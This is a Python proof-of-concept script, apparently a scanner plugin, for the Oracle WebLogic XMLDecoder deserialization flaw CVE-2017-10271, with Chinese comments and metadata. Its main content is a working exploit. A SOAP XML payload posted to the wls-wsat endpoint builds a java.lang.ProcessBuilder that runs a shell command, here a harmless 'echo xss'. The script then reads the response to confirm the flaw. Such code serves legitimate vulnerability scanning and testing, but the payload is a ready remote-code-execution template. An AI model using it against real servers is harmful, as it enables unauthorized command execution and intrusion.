#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import random
import string
import subprocess
import sys
import importlib

from random_header import get_ua


#自动安装库的功能所需要的库
class DemoPOC:
    appName = 'Weblogic'  # 漏洞影响的应用或组件名称
    appVersion = '? 10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2'  # 漏洞影响版本
    install_requires = ['requests']  # 你可以在这里添加其他需要的库
    CVE_ID = "CVE-2017-10271" #CVE编号
    Vul_name = "WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）" #漏洞名称
    Type = "反序列化漏洞"   #漏洞类型
    Description = "Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。"    #漏洞描述
    Script_type = "python"    #POC类型（暂时只支持python）
    Script = "Weblogic_CVE_2017_10271_RCE.py"         #POC文件名
    Vul_Date = "2017-10-20"  # 漏洞公开日期

    def __init__(self, url, ip, port):
        self.url = url
        self.ip = ip
        self.port = port

    def check_and_install_dependencies(self):
        """检查并安装所需的库"""
        missing_packages = []
        for package in self.install_requires:
            try:
                importlib.import_module(package)
            except ImportError:
                missing_packages.append(package)
        
        if missing_packages:
            print(f"Missing packages: {missing_packages}. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", *missing_packages])
                print(f"Successfully installed: {missing_packages}")
            except subprocess.CalledProcessError as e:
                print(f"[ERROR] Failed to install required packages: {e}")
                return False
        return True

    def random_str(self, length):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _exploit(self):
        """利用函数"""
        HEADERS = get_ua()
        HEADERS.update({'Content-Type': 'text/xml'})
        url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(self.ip, self.port)
        payload = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java>
              <object class="java.lang.ProcessBuilder">
                        <array class="java.lang.String" length="3">
                            <void index="0">
                                <string>/bin/sh</string>
                            </void>
                            <void index="1">
                                <string>-c</string>
                            </void>
                            <void index="2">
                                <string>echo xss</string>
                            </void>
                        </array>
                        <void method="start"/>
                    </object>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>
        '''
        result = {}
        try:
            res = requests.post(url, data=payload, headers=HEADERS, verify=False, timeout=5)
            result['ExploitResponse'] = res.text
            return res.text
        except requests.RequestException as e:
            result['Error'] = f"[ERROR] Request failed: {e}"
            return result

    def _verify(self):
        """验证漏洞是否存在"""
        self.check_and_install_dependencies()    #在提示无对应库时，单独运行此行代码。
        result = {}
        try:
            res = self._exploit()
            if isinstance(res, dict) and 'Error' in res:
                result.update(res)  # 传递_exploit中的错误信息
            elif res and ('<faultstring>java.lang.ProcessBuilder' in res or "<faultstring>0" in res):
                result['VerifyInfo'] = f"[!] Vulnerability found : WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）"  # 确认漏洞存在，返回[!]的信息
            else:
                result['VerifyInfo'] = "No vulnerability found."
        except Exception as e:
            result['Error'] = f"[ERROR] Error during POC execution: {str(e)}"
        return result


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python Weblogic_CVE_2017_10271_RCE.py <url> <ip> <port>")
        sys.exit(1)

    url = sys.argv[1]
    ip = sys.argv[2]
    port = int(sys.argv[3])

    poc = DemoPOC(url, ip, port)
    result = poc._verify()
    print(result['VerifyInfo'] if 'VerifyInfo' in result else result['Error'])
